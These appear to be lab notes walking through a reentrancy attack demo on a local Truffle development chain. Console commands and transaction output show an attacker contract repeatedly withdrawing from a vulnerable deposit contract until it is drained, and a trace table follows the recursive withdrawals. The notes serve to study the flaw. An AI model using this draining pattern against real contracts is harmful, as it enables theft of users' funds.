https://solidity.readthedocs.io/en/develop/security-considerations.html
https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
https://github.com/gustavoguimaraes/honeyPotReentranceAttack
http://solidity.readthedocs.io/en/develop/contracts.html
https://ethereum.stackexchange.com/questions/12778/how-to-send-some-amount-to-a-contract-in-truffle

STEP 1 - Check our initial accounts balances
truffle(develop)> Reentrant.deployed().then(instance => honeyPotAddress = instance.address)
'0x9fbda871d559710256a2502a2517b794b482db40'
truffle(develop)> ReentrantAttacker.deployed().then(instance => evilContractAddress = instance.address)
'0x30753e4a8aad7f8597332e813735def5dd395028'
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'0'
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'

STEP 2 - Deposit 5 Ethers from a known account to Reentrant instance:
truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(5, "ether") }))
If encounter Error: Invalid number of arguments to Solidity function, delete the contracts in .\build directory, compile and migrate again.

{ tx: '0x678ab27b16d2bd023c4b67c0f6f97f08acd22c05ea2b7a2dfb2b69fc7ae84c53',
  receipt:
   { transactionHash: '0x678ab27b16d2bd023c4b67c0f6f97f08acd22c05ea2b7a2dfb2b69fc7ae84c53',
     transactionIndex: 0,
     blockHash: '0x14179027a3d7c2f737cda6bff3a2778997fbfc397f790c5707761b3b02477ea0',
     blockNumber: 10,
     gasUsed: 41527,
     cumulativeGasUsed: 41527,
     contractAddress: null,
     logs: [] },
  logs: [] }
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
'5000000000000000000'

STEP 3 - Check withdraw count from Reentrant instance:
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'

Check the withdraw count from Reentrant instance:
truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 0 ] }

STEP 4 - Now invoke ReentrantAttacker attack function,
by just sending 5 ethers to deposit in Reentrant instance, and immediately calling withdraw from Reentrant instance,
ReentrantAttacker instance can steal all Ethers (10) from Reentrant
truffle(develop)> ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(5, "ether") }))
{ tx: '0xf00c295c0322cfef1eac2ca4d9ca6287f0b99d14471f81b9ae0ac0693e0068f3',
  receipt:
   { transactionHash: '0xf00c295c0322cfef1eac2ca4d9ca6287f0b99d14471f81b9ae0ac0693e0068f3',
     transactionIndex: 0,
     blockHash: '0x1c02c0862c053c70f4045fe2b023217125dfa56044ff445070b9866494bba87b',
     blockNumber: 11,
     gasUsed: 66157,
     cumulativeGasUsed: 66157,
     contractAddress: null,
     logs: [] },
  logs: [] }

STEP 5 - Check the withdraw count from Reentrant instance = 1 + no. of recursive calls
truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 2 ] }

STEP 5 - ReentrantAttacker instance now has deposit amount + amounts from Reentrant instance
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'10000000000000000000' !!!

truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
'0' !!

Points to ponder:
https://ethereum.stackexchange.com/questions/6707/whats-the-difference-between-call-value-and-call-value
http://www.blunderingcode.com/writing-secure-solidity/
https://ethereum.stackexchange.com/questions/7069/whats-the-point-of-sending-a-value-in-a-contract-deployment-transaction
https://ethereum.stackexchange.com/questions/26838/how-to-get-the-creator-of-a-contract-was-the-owner
https://ethereum.stackexchange.com/questions/11484/how-can-contract-ownership-be-transferred-from-one-account-to-another

TRACE
Reentrant has 15
truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") }))

truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'15000000000000000000'
truffle(develop)>  web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'
truffle(develop)>  Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 0 ] }

ReentrantAttacker attacks with 2
ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(2, "ether") }))

ReentrantAttacker             Reentrant      15 Ethers
                       -2     deposit()  +2  17        
                       +2     withdraw() -2  15
fallback() 15>=2       +2     withdraw() -2  13
fallback() 13>=2       +2     withdraw() -2  11
fallback() 11>=2       +2     withdraw() -2  9
fallback() 9>=2        +2     withdraw() -2  7
fallback() 7>=2        +2     withdraw() -2  5
fallback() 5>=2        +2     withdraw() -2  3
fallback() 3>=2        +2     withdraw() -2  1
fallback() 1 ! (>=2)

truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 8 ] }
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'16000000000000000000'
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'1000000000000000000'

